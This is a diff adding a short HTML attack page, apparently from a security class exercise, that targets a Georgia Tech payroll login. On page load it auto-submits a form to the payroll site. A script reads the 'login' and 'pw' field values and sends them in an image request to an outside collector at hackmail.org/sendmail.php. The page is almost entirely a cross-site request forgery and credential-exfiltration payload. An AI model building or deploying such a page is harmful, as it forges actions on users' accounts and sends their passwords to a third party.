@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<script src="http://payroll.gatech.edu/assets/jquery/js/jquery-1.7.2.min.js"></script>
+
+
+<body onload="document.forms[0].submit()">
+
+<form action="http://payroll.gatech.edu/" onsubmit="" method="post">
+
+    <!-- <input type="text" name="login" value="dan">
+    <input type="hidden" name="secret" value="whatdoido?">
+    <input type="password" name="pw" value="d">
+
+    <input name="action" value="login">
+ -->
+
+    <script>
+        function takeID() {
+            var name = document.getElementsByName("login")[0].value;
+            var pass = document.getElementsByName("pw")[0].value;
+            alert('takeId ran successful');
+            void((new Image()).src = 'http://hackmail.org/sendmail.php?' + '&username=haxor' + '&payload=' + name + " " + pass + '&random=' + Math.random());
+        }
+        document.forms[0].onsubmit = takeID();
+
+    </script>
+
+
+</form>
+</body>
+</html>
